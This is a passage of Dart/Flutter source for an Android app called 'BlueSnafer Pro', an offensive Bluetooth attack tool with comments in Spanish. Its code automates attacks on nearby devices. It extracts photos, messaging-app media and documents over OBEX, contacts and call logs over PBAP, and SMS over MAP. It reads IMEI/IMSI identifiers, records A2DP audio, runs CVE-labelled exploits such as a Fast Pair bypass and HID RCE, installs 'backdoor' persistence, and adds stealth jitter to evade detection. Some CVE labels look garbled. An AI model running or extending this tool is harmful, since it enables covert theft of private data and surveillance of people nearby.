              _appendLog('   📊 Estrategia ponderada por éxito aprendido');
            } else {
              final attackNames = await _getAdaptiveStrategy(address, deviceType);
               attackSequence = attackNames.map((name) 
                 => allAttackTechniques.firstWhere(
                      (t) => t['name'] == name || t['type'] == name,
                      orElse: () => {'type': name, 'name': name}
                    )).toList();
              _appendLog('   📋 Secuencia (heurística): ${attackNames.join(', ')}');
            }
           } else {
             attackSequence = _getAdaptiveAttackSequence(deviceType);
             _appendLog('   📋 Secuencia: ${attackSequence.map((a) => a['name'] ?? a['type']).join(', ')}');
           }

          // === FASE 0.5: SISTEMA AVANZADO UNIFICADO ===
          if (_enableAdvancedSystem && _enableAdaptiveIntelligence) {
            final advancedJson = await _runAdvancedSystemPhase(address);
            final strategyExploits = (advancedJson['strategy'] as Map?)?['recommendedExploits'];
            if (strategyExploits is List && strategyExploits.isNotEmpty) {
              final mlTechniques = _techniquesFromMlExploits(
                strategyExploits.cast<String>(),
              );
              attackSequence = _mergeAttackSequence(attackSequence, mlTechniques);
              _appendLog('   🔀 Secuencia ampliada con ${mlTechniques.length} técnicas ML');
            }
          }
          
          // === FASE 1-6: ATAQUES (PARALELO si están agrupados) ===
        await _executeParallelAttacks(device, attackSequence);

        // === POST-PROCESAMIENTO ===
        if (_enableNetworkAnalysis) {
          _appendLog('🌐 [POST] Análisis de red...');
          _networkAnalysis = await _extractNetworkInfo(address);
        }

        if (_enablePatternAnalysis) {
          if (_deepAnalysis && _obexFiles.isNotEmpty) {
            _appendLog('🔬 [POST] Análisis profundo de patrones...');
            await _deepPatternAnalysis();
          } else if (_obexFiles.isNotEmpty || _pbapContacts.isNotEmpty) {
            _appendLog('🔬 [POST] Análisis de patrones...');
            await _analyzeExtractedPatterns();
          }
        }

        if (_enablePersistence &&
            !_installedBackdoors.any((b) => b['address'] == address)) {
          await _installPersistenceMechanism(address, displayName);
        }

        if (_stealthMode) {
          await _executeStealthMode(address, displayName);
        }
        
        // === GENERAR REPORTE ===
        int totalVulns = 0;
        for (final r in _fullScanResults) {
          totalVulns += (r['vulnCount'] as int?) ?? 0;
        }
        await _generateAutomatedReport(
          totalFiles: _obexFiles.length,
          totalContacts: _pbapContacts.length,
          totalVulns: totalVulns,
          attacksExecuted: attackSequence.length,
          attacksSucceeded: _executedAttacks.length,
        );
        
        // Save per-device success report
        await _saveDeviceReport(address, {
          'files': _obexFiles.length,
          'contacts': _pbapContacts.length,
          'appData': 0,
          'attacks': attackSequence.map((a) => a['name'] ?? a['type']).toList(),
          'timestamp': DateTime.now().toIso8601String(),
          'success': true,
          'deviceType': deviceType,
        });
        
        _appendLog('✅ Objetivo $displayName completado');
      } catch (e) {
        _appendLog('❌ Error procesando $address: $e');
        await _saveDeviceReport(address, {
          'error': e.toString(),
          'timestamp': DateTime.now().toIso8601String(),
          'success': false,
        });
      }
      
      // Espera entre dispositivos: en modo sigiloso usamos jitter para no generar patrón.
      if (_stealthMode) {
        await Future.delayed(Duration(milliseconds: 5000 + _stealthRng.nextInt(4000)));
      } else {
        await Future.delayed(const Duration(seconds: 3));
      }
    }

    final name = _selectedDevice!['name'] ?? 'Unknown';
    final address = _selectedDevice!['address'] ?? '';

    _appendLog('');
    _appendLog('╔══════════════════════════════════════╗');
    _appendLog('║   🤖 MODO DESATENDIDO COMPLETADO    ║');
    _appendLog('╚══════════════════════════════════════╝');
    _appendLog('📊 RESUMEN FINAL:');
    _appendLog('   🎯 Objetivo: $name ($address)');
    _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    if (mounted) setState(() => _isUnattendedRunning = false);
    // Sesión completada de forma normal: limpiar marca reanudable.
    _sessionResumable = false;
    try {
      final prefs = await SharedPreferences.getInstance();
      prefs.setBool('unattended_resumable', false);
    } catch (_) {}
    } catch (error) {
      _appendLog('💥 CRASH: $error');
      try {
        final dir = await getApplicationDocumentsDirectory();
        final File f = File('${dir.path}/bluesnafer_crash.txt');
        await f.writeAsString('CRASH: $error');
      } catch (_) {}
      if (mounted) setState(() => _isUnattendedRunning = false);
  }
}

  // OBEX con reintentos inteligentes en múltiples directorios
  Future<int> _unattendedOBEXExtract(String address, String displayName) async {
    int downloaded = 0;
    
    _appendLog('  📂 Iniciando extracción OBEX FTP...');
    
    // Intentar hasta 3 veces en caso de fallo de conexión
    for (int attempt = 1; attempt <= 3; attempt++) {
      if (!_isUnattendedRunning) return downloaded;
      
      try {
        _appendLog('  🔄 Intento OBEX #$attempt...');
        
        // 1. Lista raíz
        final rootResult = await _exploitService.executeAttack(
          deviceAddress: address,
          type: 'file_exfil',
          command: 'scan',
        );

        if (rootResult['success'] == true) {
          final rootFiles = (rootResult['files'] as List? ?? [])
              .map<Map<String, dynamic>>((f) => Map<String, dynamic>.from(f as Map))
              .toList();
          
          _appendLog('  ✅ Raíz: ${rootFiles.length} archivos encontrados');
          
          if (mounted) {
            setState(() => _obexFiles = rootFiles);
          }
          
          // Descargar archivos de la raíz
          for (final file in rootFiles) {
            final fileName = file['name']?.toString() ?? '';
            if (fileName.isEmpty) continue;
            
            try {
              final dlResult = await _exploitService.downloadFile(address, fileName);
              if (dlResult['success'] == true) {
                downloaded++;
                final size = dlResult['size'] ?? 0;
                _appendLog('    ✅ $fileName ($size bytes)');
                _collectedData.add('📥 [$displayName] $fileName ($size bytes)');
              }
            } catch (e) {
              _appendLog('    ❌ $fileName: $e');
            }
          }
        }

        // 2. Escanear directorios de fotos y datos
        final searchDirs = [
          'DCIM/Camera', 'DCIM', 'Pictures', 'Screenshots',
          'Download', 'Documents', 'WhatsApp/Media', 'Telegram',
          'Android/data', 'Android/media'
        ];
        
        for (final dir in searchDirs) {
          if (!_isUnattendedRunning) return downloaded;
          
          try {
            final dirResult = await _exploitService.executeAttack(
              deviceAddress: address,
              type: 'file_exfil_dir',
              command: dir,
            );
            
            if (dirResult['success'] == true) {
              final dirFiles = (dirResult['files'] as List? ?? [])
                  .map<Map<String, dynamic>>((f) => {
                    ...Map<String, dynamic>.from(f as Map),
                    'path': '$dir/${f['name']}',
                  })
                  .toList();
              
              // Filtrar archivos interesantes
              final interestingFiles = dirFiles.where((f) {
                final name = (f['name']?.toString() ?? '').toLowerCase();
                return name.endsWith('.jpg') || name.endsWith('.jpeg') || name.endsWith('.png') ||
                       name.endsWith('.mp4') || name.endsWith('.gif') || name.endsWith('.webp') ||
                       name.endsWith('.vcf') || name.endsWith('.txt') || name.endsWith('.pdf') ||
                       name.endsWith('.doc') || name.endsWith('.docx') || name.endsWith('.xls') ||
                       name.endsWith('.xlsx') || name.endsWith('.db') || name.endsWith('.sqlite');
              }).toList();
              
              if (interestingFiles.isNotEmpty) {
                _appendLog('  📁 $dir: ${interestingFiles.length} archivos interesantes');
                
                // Descargar hasta 15 archivos por directorio
                for (final file in interestingFiles.take(15)) {
                  if (!_isUnattendedRunning) return downloaded;
                  final filePath = file['path']?.toString() ?? file['name']?.toString() ?? '';
                  if (filePath.isEmpty) continue;
                  
                  try {
                    final dlResult = await _exploitService.downloadFile(address, filePath);
                    if (dlResult['success'] == true) {
                      downloaded++;
                      final size = dlResult['size'] ?? 0;
                      _appendLog('    ✅ ${file['name']} ($size bytes)');
                      _collectedData.add('📥 [$displayName] ${file['name']} ($size bytes)');
                    }
                  } catch (e) {
                    // Silenciar errores individuales de descarga
                  }
                }
              }
            }
          } catch (e) {
            // Directorio no accesible
          }
        }
        
        // Si conseguimos archivos, no necesitamos más intentos
        if (downloaded > 0) {
          _appendLog('  ✅ $downloaded archivos descargados de OBEX');
          break;
        }
        
        // Esperar antes del siguiente intento
        if (attempt < 3) {
          _appendLog('  ⏳ Esperando 5s antes del siguiente intento...');
          await Future.delayed(const Duration(seconds: 5));
        }
      } catch (e) {
        _appendLog('  ❌ OBEX intento #$attempt fallido: $e');
        if (attempt < 3) {
          await Future.delayed(const Duration(seconds: 5));
        }
      }
    }
    
    if (downloaded == 0) {
      _appendLog('  ❌ OBEX: No se pudieron descargar archivos tras 3 intentos');
    } else {
      _appendLog('  ✅ OBEX: $downloaded archivos descargados exitosamente');
      _collectedData.add('📥 [$displayName] $downloaded archivos OBEX descargados');
      _saveState();
    }
    
    return downloaded;
  }

  // PBAP con reintentos
  Future<Map<String, int>> _unattendedPBAPExtract(String address, String displayName) async {
    int contacts = 0;
    int files = 0;
    
    _appendLog('  📇 Intentando extracción PBAP...');
    
    for (int attempt = 1; attempt <= 2; attempt++) {
      if (!_isUnattendedRunning) return {'contacts': contacts, 'files': files};
      
      try {
        _appendLog('  🔄 PBAP intento #$attempt...');
        final result = await _exploitService.pbapExtract(address, extractType: 'all');
        
        if (result['success'] == true) {
          contacts = result['contactCount'] ?? 0;
          files = result['callCount'] ?? 0;
          
          if (mounted) {
            setState(() {
              if (result['contacts'] != null) {
                _pbapContacts = (result['contacts'] as List)
                    .map<Map<String, dynamic>>((c) => Map<String, dynamic>.from(c as Map))
                    .toList();
              }
              if (result['calls'] != null) {
                _pbapCalls = (result['calls'] as List)
                    .map<Map<String, dynamic>>((c) => Map<String, dynamic>.from(c as Map))
                    .toList();
              }
            });
            _saveState();
          }
          
          _appendLog('  ✅ PBAP: $contacts contactos, $files llamadas extraídas');
          _collectedData.add('📇 [$displayName] $contacts contactos, $files llamadas');
          break;
        }
        
        if (attempt < 2) {
          await Future.delayed(const Duration(seconds: 3));
        }
      } catch (e) {
        _appendLog('  ❌ PBAP intento #$attempt fallido: $e');
        if (attempt < 2) {
          await Future.delayed(const Duration(seconds: 3));
        }
      }
    }
    
    if (contacts == 0 && files == 0) {
      _appendLog('  ❌ PBAP: No se pudieron extraer datos tras 2 intentos');
    }
    
    return {'contacts': contacts, 'files': files};
  }

  Future<void> _delayedAttack(String type, {String? command, String? script, int delayMs = 1000}) async {
    if (!_isUnattendedRunning) return;

    await _attack(type, command: command, script: script);
    await Future.delayed(Duration(milliseconds: delayMs));
  }

  IconData _getDeviceIcon(String deviceType) {
    switch (deviceType.toLowerCase()) {
      case 'smartphone': return Icons.smartphone;
      case 'wearable': return Icons.watch;
      case 'audio': return Icons.speaker;
      case 'car': return Icons.directions_car;
      case 'laptop': return Icons.laptop;
      case 'tablet': return Icons.tablet;
      case 'peripheral': return Icons.keyboard;
      case 'beacon': return Icons.sensors;
      default: return Icons.bluetooth;
    }
  }

  String _getDeviceType(Map<String, dynamic> device) {
    return device_utils.detectDeviceType(device);
  }

   /// Ejecuta un ataque individual con timeouts y reintentos adaptativos
   /// Usa backoff exponencial: delay = baseDelay * 2^attempt
     Future<void> _attack(String type, {String? command, String? script, Map<String, dynamic>? extra, bool fromAutomated = false}) async {
     // === Validaciones ===
      if (!fromAutomated && _isAttacking) {
        _appendLog('⏳ Ataque en progreso, espera...');
        return;
      }
     if (_selectedDevice == null) {
       _appendLog('❌ ERROR: Selecciona un dispositivo primero');
       if (mounted) {
         ScaffoldMessenger.of(context).showSnackBar(
           const SnackBar(
             content: Text('⚠️ Selecciona un dispositivo del radar primero', style: TextStyle(fontSize: 12)),
             backgroundColor: Colors.red,
             duration: Duration(seconds: 2),
             behavior: SnackBarBehavior.floating,
           ),
         );
       }
       return;
     }

     final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
     final addr = _selectedDevice!['address']?.toString() ?? '';
     final attackLabel = command ?? script ?? type;

     if (addr.isEmpty || addr == '??:??:??') {
       _appendLog('❌ ERROR: Dispositivo sin dirección MAC válida');
       return;
     }

     // === Configuración de timeout/reintentos ===
     final config = _attackConfigs[type];
     final timeoutMs = config?['timeout'] ?? _defaultAttackTimeout;
     final maxRetries = config?['retries'] ?? _defaultMaxRetries;
     final baseDelayMs = config?['delay'] ?? _defaultRetryDelay;

      _appendLog('⚡ [$type] $attackLabel → $displayName ($addr) | timeout=${timeoutMs}ms retries=$maxRetries');
      _lastAttackType = type;

      // PRE-CHECK: Saltar si requiere root y no está disponible
      if (_rootRequiredTypes.contains(type)) {
        final rootOk = await RealExploitService.hasRootAccess();
        if (!rootOk) {
          _appendLog('  🔒 $attackLabel: REQUIERE ROOT (no disponible) — omitiendo');
          setState(() => _activeAttackCount++);
          setState(() => _activeAttackCount--);
          return;
        }
        _appendLog('  🔓 $attackLabel: ejecutado con ROOT ✅');
      }

      setState(() => _activeAttackCount++);

      if (mounted && (!_stealthMode || !fromAutomated)) {
       ScaffoldMessenger.of(context).showSnackBar(
         SnackBar(
           content: Text('⚡ Iniciando $type:$attackLabel en $displayName...', style: const TextStyle(fontSize: 12)),
           backgroundColor: Colors.orange[900],
           duration: const Duration(seconds: 2),
           behavior: SnackBarBehavior.floating,
           margin: const EdgeInsets.only(bottom: 120, left: 16, right: 16),
         ),
       );
     }

     // === Bucle de reintentos con backoff exponencial ===
     int attempt = 0;
     bool success = false;
     Map<String, dynamic>? result;
     String finalMessage = '';

while (attempt <= maxRetries && !success) {
        if (fromAutomated && !_isUnattendedRunning) break;
        attempt++;

       // Ajustar command para OPP_PUSH si hay archivos reales disponibles
       String? actualCommand = command;
       String? actualScript = script;
       if (type == 'opp_push' && _obexFiles.isNotEmpty) {
         // Usar el primer archivo encontrado (más relevante)
         final realFile = _obexFiles.first;
         actualCommand = realFile['path']?.toString() ?? '/sdcard/DCIM/Camera/bluesnafer.jpg';
         if (attempt == 1) {
           _appendLog('  📁 OPP_PUSH usando archivo real: ${realFile['name']} (${realFile['path']})');
         }
       }

       try {
         _appendLog('  🔄 Intento #$attempt/${maxRetries}...');

          // Ejecutar con timeout
          result = await _exploitService.executeAttack(
            deviceAddress: addr,
            type: type,
            command: actualCommand,
            script: actualScript,
            extra: extra,
          ).timeout(
            Duration(milliseconds: timeoutMs),
            onTimeout: () => {'success': false, 'message': 'Timeout after ${timeoutMs}ms'},
          );

          success = result['success'] == true;
          // Los handlers Kotlin devuelven el motivo en 'error' o 'note', no siempre en 'message'
          finalMessage = (result['message'] ?? result['error'] ?? result['note'])?.toString() ??
              (success ? 'OK' : 'Sin respuesta');

          final bool rootRequired = result['rootRequired'] == true;
          final bool rootAvailable = result['rootAvailable'] == true;

          if (rootRequired && !rootAvailable) {
            _appendLog('  🔒 $attackLabel: REQUIERE ROOT (no disponible)');
            _appendLog('  ⚠️  ${result['message'] ?? result['error'] ?? result['note'] ?? 'Este exploit necesita un dispositivo rooteado'}');
            break;
          }

          if (rootRequired && rootAvailable) {
            _appendLog('  🔓 $attackLabel: ejecutado con ROOT ✅');
          }

          if (success) {
            _appendLog('  ✅ $attackLabel éxito en intento $attempt');
          } else {
            _appendLog('  ❌ $attackLabel falló: $finalMessage');
          }

       } on TimeoutException catch (e) {
         success = false;
         finalMessage = 'Timeout: ${e.message}';
         _appendLog('  ⏰ $attackLabel timeout: ${e.message}');
       } catch (e) {
         success = false;
         finalMessage = e.toString();
         _appendLog('  💥 $attackLabel excepción: $e');
       }

// Si falló y hay más reintentos, esperar con backoff exponencial
        if (!success && attempt <= maxRetries) {
         var delayMs = baseDelayMs * (1 << (attempt - 1)); // 2^(attempt-1) * baseDelay
         if (_stealthMode) { delayMs += _stealthRng.nextInt(3000); } // jitter anticaptura de patrones
         final delaySec = delayMs ~/ 1000;
         if (delaySec > 0) {
           _appendLog('  ⏳ Esperando ${delaySec}s antes de reintento...');
           await Future.delayed(Duration(milliseconds: delayMs));
         }
       }
      }

        // === Registrar diagnóstico de fallo para la pestaña DATOS ===
        if (!success) {
          final reason = finalMessage.isEmpty ? 'sin respuesta del objetivo' : finalMessage;
          _attackDiagnostics.add({'type': type, 'label': attackLabel, 'reason': reason});
          if (_attackDiagnostics.length > 200) _attackDiagnostics.removeAt(0);
          if (mounted) setState(() {});
        }

        // Registrar resultado en SuccessOptimizer para mejorar backoff futuro
        if (addr.isNotEmpty) {
          _successOptimizer.recordResult(
            deviceAddress: addr,
            attackType: type,
            success: success,
            durationMs: timeoutMs,
          );
          // Alimentar learning counts para SmartRecommendationSystem
          final key = type;
          _learnedTechniques[key] = (_learnedTechniques[key] ?? 0) + (success ? 1 : 0);
        }

        // === Procesar resultado final ===
      try {
       final packets = result?['packets'];
       final effectiveness = result?['effectiveness'];
       final services = result?['services'];
       final characteristics = result?['characteristics'];
       final targetName = device_utils.getDeviceDisplayName(_selectedDevice!);

       // Recolectar datos REALES del ataque (cap 100)
       if (success) {

          if (services != null) {
            _collectedData.add('📡 [$targetName] $services servicios GATT descubiertos');
          }
          if (characteristics != null) {
            _collectedData.add('🔗 [$targetName] $characteristics características encontradas');
          }
          if (packets != null) {
            _collectedData.add('📦 [$targetName] $packets paquetes enviados');
          }
          if (effectiveness != null) {
            _collectedData.add('🎯 [$targetName] Efectividad: ${(effectiveness * 100).toStringAsFixed(0)}%');
          }
          _collectedData.add('✅ [$targetName] $type:$attackLabel completado');

           // === Captura de datos específicos por CVE ===
           if (type == 'cve_2025_13834_heartbleed') {
             final bytesLeaked = result?['totalBytesLeaked'];
             final reads = result?['successfulReads'];
             final extracted = result?['extractedInfo'];
             if (bytesLeaked != null) {
               _collectedData.add('💀 [$targetName] Heartbleed: $bytesLeaked bytes filtrados (${reads ?? 0} lecturas)');
             }
             if (extracted != null && extracted is Map) {
               final info = extracted as Map;
               final phones = (info['phoneNumbers'] as List?)?.length ?? 0;
               final wifi = (info['wifiNetworks'] as List?)?.length ?? 0;
               final macs = (info['macAddresses'] as List?)?.length ?? 0;
               final keys = (info['potentialKeys'] as List?)?.length ?? 0;
               if (phones > 0 || wifi > 0 || macs > 0 || keys > 0) {
                 _collectedData.add('🔑 [$targetName] Credenciales extraídas: $phones teléfonos, $wifi redes WiFi, $macs MACs, $keys claves');
               }
               // Mostrar ejemplos concretos (máx 3 cada uno)
               final phonesList = (info['phoneNumbers'] as List?)?.take(3).toList();
               final examplePhones = phonesList?.join(', ');
               if (examplePhones != null && examplePhones.isNotEmpty) {
                 _collectedData.add('📞 [$targetName] Teléfonos: $examplePhones');
               }
               final wifiList = (info['wifiNetworks'] as List?)?.take(3).toList();
               final exampleWifi = wifiList?.join(', ');
               if (exampleWifi != null && exampleWifi.isNotEmpty) {
                 _collectedData.add('📶 [$targetName] Redes WiFi: $exampleWifi');
               }
             }
           }

          if (type == 'cve_2024_43770_hid_rce') {
            final payload = result?['payloadType'];
            _collectedData.add('💻 [$targetName] HID RCE ejecutado (${payload ?? 'payload desconocido'})');
          }

          if (type == 'cve_2025_36911_fastpair') {
            final modelId = result?['modelId'];
            final bondState = result?['bondState'];
            final successBypass = result?['success'] == true;
            final bonded = bondState == 12 || bondState == 'BOND_BONDED';
            final stateStr = bonded ? 'EMPAREJADO' : 'trust=$bondState';
            _collectedData.add('🔄 [$targetName] Fast Pair bypass: ${successBypass ? stateStr : "falló"} (modelo: ${modelId ?? 'unknown'})');
          }

          if (type == 'fastpair_key_extract') {
            final keys = (result?['keys'] as List?)?.length ?? 0;
            final successKeys = result?['success'] == true;
            if (successKeys && keys > 0) {
              _collectedData.add('🔑 [$targetName] Fast Pair keys extraídas: $keys');
            } else {
              _collectedData.add('🔑 [$targetName] Fast Pair keys: no encontradas');
            }
          }

          // === Captura A2DP Recording ===
          if (type == 'a2dp_record' || type == 'a2dp_stream') {
            final filePath = result?['file'];
            final duration = result?['durationSec'];
            final bytes = result?['bytesRecorded'];
            final success = result?['success'] == true;
            if (success) {
              _collectedData.add('🎤 [$targetName] A2DP audio capturado: ${duration ?? '?'}s, ${bytes ?? '?'} bytes en ${filePath ?? 'archivo desconocido'}');
            } else {
              final err = result?['error'] ?? 'unknown';
              _collectedData.add('🎤 [$targetName] A2DP recording falló: $err');
            }
          }

          // === Captura GATT Bulk Read ===
          if (type == 'gatt_bulk_read') {
            final services = result?['servicesDiscovered'];
            final chars = result?['characteristicsRead'];
            final failures = result?['readFailures'];
            final sample = result?['sampleReads'];
            _collectedData.add('📡 [$targetName] GATT bulk: $services servicios, $chars características leídas, $failures fallos');
            if (sample is List && sample.isNotEmpty) {
              final sampleList = sample as List;
              _collectedData.add('📋 [$targetName] Muestra GATT: ${sampleList.take(3).join('; ')}');
            }
            // Almacenar dump completo para el tab DATOS (valores legibles sin pareo)
            final fullDump = result?['fullDump'] as List?;
            if (fullDump != null && fullDump.isNotEmpty) {
              if (mounted) {
                setState(() {
                  _gattDump.removeWhere((e) => e['device'] == targetName);
                  for (final entry in fullDump) {
                    final parts = entry.toString().split('=');
                    final path = parts[0];
                    final hexValue = parts.length > 1 ? parts[1] : '';
                    _gattDump.add({
                      'device': targetName,
                      'path': path,
                      'hex': hexValue,
                      'ascii': _hexToAscii(hexValue),
                    });
                  }
                });
                _saveState();
              }
              _collectedData.add('📶 [$targetName] ${fullDump.length} valores GATT almacenados sin pareo');
            }
          }

          if (type == 'gatt_monitor') {
            final changes = result?['totalChanges'];
            final unique = result?['uniqueCharacteristics'];
            _collectedData.add('📡 [$targetName] GATT monitor: $changes cambios, $unique características únicas');
          }

          // === Captura MAP Extraction ===
          if (type == 'map_extract') {
            final messages = result?['messages'];
            final count = result?['count'];
            final sample = result?['sample'];
            if (count != null && count is int && count > 0) {
              _collectedData.add('📨 [$targetName] MAP SMS extraídos: $count mensajes');
              if (sample is List && sample.isNotEmpty) {
                _collectedData.add('📋 [$targetName] Muestra SMS: ${(sample as List).take(2).join('; ')}');
              }
            } else {
              final err = result?['error'] ?? 'unknown';
              _collectedData.add('📨 [$targetName] MAP falló: $err');
            }
          }

          if (type == 'map_folders') {
            final folders = result?['folders'];
            final count = result?['count'];
            if (folders is List && folders.isNotEmpty) {
              _collectedData.add('📁 [$targetName] MAP carpetas: ${(folders as List).take(5).join(', ')}');
            }
           }

          // === Captura AT Identity Extraction ===
          if (type == 'at_extract_identity') {
            final imei = result?['imei']?.toString() ?? '';
            final imsi = result?['imsi']?.toString() ?? '';
            final iccid = result?['iccid']?.toString() ?? '';
            if (imei.isNotEmpty) {
              final luhn = result?['imeiLuhnValid'] == true ? ' (Luhn OK)' : ' (Luhn inválido)';
              _collectedData.add('📱 [$targetName] IMEI: $imei$luhn');
            }
            if (imsi.isNotEmpty) _collectedData.add('🪪 [$targetName] IMSI: $imsi');
            if (iccid.isNotEmpty) _collectedData.add('💳 [$targetName] ICCID: $iccid');
            if (imei.isEmpty && imsi.isEmpty) {
              final err = result?['note'] ?? result?['error'] ?? 'sin canal AT';
              _collectedData.add('🆔 [$targetName] AT identity falló: $err');
            }
          }

          // === Captura Gallery Photos Extraction ===
          if (type == 'extract_images') {
            final images = result?['images'];
            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
            final totalBytes = result?['totalBytes'] ?? 0;
            if (count is int && count > 0) {
              _collectedData.add('📸 [$targetName] Galería: $count fotos extraídas ($totalBytes bytes)');
              if (images is List && images.isNotEmpty) {
                for (final img in images.take(3)) {
                  _collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
                }
              }
            } else {
              final err = result?['note'] ?? result?['error'] ?? 'galería no accesible';
              _collectedData.add('📸 [$targetName] Galería falló: $err');
            }
          }

          // === Captura MediaStore Enhanced ===
          if (type == 'mediastore_enhanced') {
            final images = result?['images'];
            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
            final totalBytes = result?['totalBytes'] ?? 0;
            if (count is int && count > 0) {
              _collectedData.add('📸 [$targetName] MediaStore Enhanced: $count imógenes ($totalBytes bytes)');
              if (images is List && images.isNotEmpty) {
                for (final img in images.take(3)) {
                  _collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
                }
              }
            } else {
              final err = result?['error'] ?? 'MediaStore no accesible';
              _collectedData.add('📸 [$targetName] MediaStore Enhanced falló: $err');
            }
          }

          // === Captura GATT Image Read ===
          if (type == 'gatt_image_read') {
            final images = result?['images'];
            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
            final totalBytes = result?['totalBytes'] ?? 0;
            final charsScanned = result?['characteristicsScanned'] ?? 0;
            if (count is int && count > 0) {
              _collectedData.add('📸 [$targetName] GATT Image Read: $count imógenes ($totalBytes bytes, $charsScanned chars escaneados)');
              if (images is List && images.isNotEmpty) {
                for (final img in images.take(3)) {
                  _collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
                }
              }
            } else {
              _collectedData.add('📸 [$targetName] GATT Image Read: $charsScanned characteristics escaneados, sin imógenes');
            }
          }

          // === Captura Quick Share / Nearby Receptor (imágenes compartidas) ===
          if (type == 'quickshare_server') {
            final images = result?['images'];
            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
            final totalBytes = result?['totalBytes'] ?? 0;
            if (count is int && count > 0) {
              _collectedData.add('🌟 [$targetName] Quick Share Receptor: $count imógenes recibidas ($totalBytes bytes)');
              if (images is List && images.isNotEmpty) {
                for (final img in images.take(3)) {
                  _collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
                }
              }
            } else {
              final err = result?['message'] ?? result?['error'] ?? 'el target no compartió';
              _collectedData.add('🌟 [$targetName] Quick Share Receptor: $err');
            }
          }

          // === Captura de familias de capa de enlace: KNOB / BIAS / BleedingTooth ===
          if (type == 'knob' || type == 'cve_2021_10134_bias' || type == 'cve_2020_26558_bleeding') {
            final cve = result?['cve'] ?? '';
            final rootUsed = result?['rootUsed'] == true;
            final note = result?['note'];
            final rootMsg = rootUsed ? ' (ROOT)' : ' (sin root, limitado)';
            if (result?['success'] == true) {
              _collectedData.add('🔒 [$targetName] $type$rootMsg completado (CVE $cve)${note != null ? ' - $note' : ''}');
            } else {
              _collectedData.add('⚠️ [$targetName] $type falló: ${result?['message'] ?? result?['error'] ?? 'sin señal'}');
            }
          }

          // === Captura OPP Server Mode ===
          if (type == 'opp_server_mode') {
            final images = result?['images'];
            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
            final totalBytes = result?['totalBytes'] ?? 0;
            if (count is int && count > 0) {
              _collectedData.add('📸 [$targetName] OPP Server: $count imógenes recibidas ($totalBytes bytes)');
              if (images is List && images.isNotEmpty) {
                for (final img in images.take(3)) {
                  _collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
                }
              }
            } else {
              _collectedData.add('📸 [$targetName] OPP Server: sin imógenes recibidas (target no conectó)');
            }
          }

          // === Captura MAP Image Extract ===
          if (type == 'map_image_extract') {
            final images = result?['images'];
            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
            final totalBytes = result?['totalBytes'] ?? 0;
            if (count is int && count > 0) {
              _collectedData.add('📸 [$targetName] MAP Image Extract: $count imógenes ($totalBytes bytes)');
              if (images is List && images.isNotEmpty) {
                for (final img in images.take(3)) {
_collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
                }
              }
            } else {
              _collectedData.add('📸 [$targetName] MAP Image Extract: sin imógenes adjuntas');
            }
          }
        if (characteristics != null) {
         _collectedData.add('🔗 [$targetName] $characteristics características encontradas');
       }
       if (packets != null) {
         _collectedData.add('📦 [$targetName] $packets paquetes enviados');
       }
       if (effectiveness != null) {
         _collectedData.add('🎯 [$targetName] Efectividad: ${(effectiveness * 100).toStringAsFixed(0)}%');
       }
        _collectedData.add('✅ [$targetName] $type:$attackLabel completado');
        }

      } catch (_) {
        // Blindaje: un parseo inesperado de resultados nunca detiene el modo automático.
      }

      // Registro en suggestion engine deshabilitado temporalmente
      

      if (mounted) {
       setState(() {
         if (success) {
           _executedAttacks.add(type);
           if (_isUnattendedRunning) _sessionCompletedAttacks.add(type);
         }
         _getSuggestion();
       });
       _saveState();
       _appendLog(success ? '✅ $attackLabel OK' : '❌ $attackLabel FALLÓ (intentos: $attempt/$maxRetries): $finalMessage');

       // Snackbar resultado
       if (mounted) {
         ScaffoldMessenger.of(context).showSnackBar(
           SnackBar(
             content: Column(
               crossAxisAlignment: CrossAxisAlignment.start,
               mainAxisSize: MainAxisSize.min,
               children: [
                 Row(
                   children: [
                     Icon(success ? Icons.check_circle : Icons.error,
                          color: success ? Colors.greenAccent : Colors.redAccent, size: 16),
                     const SizedBox(width: 8),
                     Expanded(
                       child: Text(
                         '${success ? "ÉXITO" : "FALLO"}: $type:$attackLabel (intentos: $attempt)',
                         style: TextStyle(
                           color: success ? Colors.greenAccent : Colors.redAccent,
                           fontSize: 12,
                         ),
                       ),
                     ),
                   ],
                 ),
                 if (!success && attempt > 1)
                   Text('Último error: $finalMessage', style: const TextStyle(fontSize: 10, color: Colors.redAccent)),
               ],
             ),
             backgroundColor: success ? Colors.green[900] : Colors.red[900],
             duration: Duration(seconds: success ? 2 : 4),
             behavior: SnackBarBehavior.floating,
             margin: const EdgeInsets.only(bottom: 120, left: 16, right: 16),
           ),
         );
       }
      }

       setState(() {
         _activeAttackCount--;
         if (_activeAttackCount < 0) _activeAttackCount = 0;
       });
     }

    String _getManufacturer(String address) {
       return device_utils.getManufacturer(address);
     }

   @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF020617),
      appBar: PreferredSize(
        preferredSize: const Size.fromHeight(56),
        child: AppBar(
          titleSpacing: 0,
          title: Row(
            children: [
              const SizedBox(width: 8),
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: Colors.cyanAccent.withValues(alpha: 0.15),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: Colors.cyanAccent.withValues(alpha: 0.3), width: 1),
                ),
                child: const Icon(Icons.bluetooth, color: Colors.cyanAccent, size: 18),
              ),
              const SizedBox(width: 10),
              Column(
                mainAxisAlignment: MainAxisAlignment.center,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: const [
                  Text('BlueSnafer Pro', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.white)),
                  Text('v1.1.0 (6)', style: TextStyle(fontSize: 9, color: Colors.white38)),
                ],
              ),
              const Spacer(),
              // Botón escanear pequeño
              Container(
